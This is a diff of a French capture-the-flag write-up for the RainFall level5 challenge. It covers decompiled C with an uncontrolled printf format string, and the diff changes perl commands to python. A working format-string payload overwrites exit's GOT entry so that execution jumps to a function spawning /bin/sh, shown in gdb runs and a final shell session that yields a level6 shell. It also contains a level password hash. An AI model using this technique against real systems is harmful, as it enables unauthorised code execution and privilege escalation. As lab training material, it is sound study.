@@ -7,23 +7,22 @@ pass : `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`
 ```c
 #include <stdio.h>
 
-// 0x080484a4
-void	o() {
+int m = 0;  // 0x08049854
+
+void	o() {  // 0x080484a4
 	system("/bin/sh");
 	_exit(1);
 }
 
-// 0x080484c2
-void	n() {
-	// char *fgets(char *s, int size, FILE *stream);
-	char	str[520];  // 0x208
-	fgets(str, 512, stdin);  // 0x200
-	printf(str);
+void	n() {  // 0x080484c2
+	char	buf[520];  // ebp-0x208 | esp+0x10
+
+	fgets(buf, 512, stdin);  // 0x200
+	printf(buf);
 	exit(1);
 }
 
-// 0x08048504
-void	main() {
+void	main() {  // 0x08048504
 	n();
 }
 ```
@@ -31,7 +30,7 @@ void	main() {
 ## Recherche :
 
 > Ici, on voit que la fonction `o()` à l'adresse `0x080484a4` nous permettrait d'exécuter un shell.
-> On va donc exploiter `printf()` pour changer le pointeur de fonction de `exit()` pour le faire pointer plutôt vers `o()`
+> On va donc exploiter `printf()` pour changer le pointeur de fonction de `exit()` pour le faire pointer plutôt vers `o()`. On va donc faire comme l'exercice précédent, mais cette fois au lieux d'écrire dans une variable, on va écrire dans une fonction.
 
 Comme fait précédement, on va chercher l'offset qu'on trouve à `4`:
 ```
@@ -106,25 +105,14 @@ Donc on veut excrire `0x84a4` puis `0x0804`
 - `0x0804` - `8` = `2044`
 - `0x84a4` - `0x0804` = `31904`
 
-
 `
-r < <(perl -e 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4\$hn%31904x%5\$hn"')`
+r < <(python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn"')`
 
 ```gdb
-(gdb) disas o
-Dump of assembler code for function o:
-   0x080484a4 <+0>:     push   %ebp
-   0x080484a5 <+1>:     mov    %esp,%ebp
-   0x080484a7 <+3>:     sub    $0x18,%esp
-   0x080484aa <+6>:     movl   $0x80485f0,(%esp)
-   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
-   0x080484b6 <+18>:    movl   $0x1,(%esp)
-   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
-End of assembler dump.
-(gdb) b *0x080484a7
-Breakpoint 1 at 0x80484a7
-(gdb) r < <(perl -e 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4\$hn%31904x%5\$hn"')
-Starting program: /home/kali/rainfall/level5 < <(perl -e 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4\$hn%31904x%5\$hn"')
+(gdb) b o
+Breakpoint 1 at 0x80484aa
+(gdb) r < <(python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn"')
+Starting program: /home/user/level5/level5 < <(python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn"')
 :8
 .
 .
@@ -132,14 +120,14 @@ Starting program: /home/kali/rainfall/level5 < <(perl -e 'print "\x3a\x98\x04\x0
 Breakpoint 1, 0x080484a7 in o ()
 (gdb)
 ```
-On a donc réussi à atteindre `o()`
+On a donc réussi à atteindre `o()` :)
 
 Il ne reste plus qu'à lancer la commande et récuperer le pass.
 
 ## Exploit :
 
 ```shell
-level5@RainFall:~$ (perl -e 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4\$hn%31904x%5\$hn"';cat) | ./level5
+level5@RainFall:~$ (python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn"';cat) | ./level5
 whoami
 level6
 cd ../level6
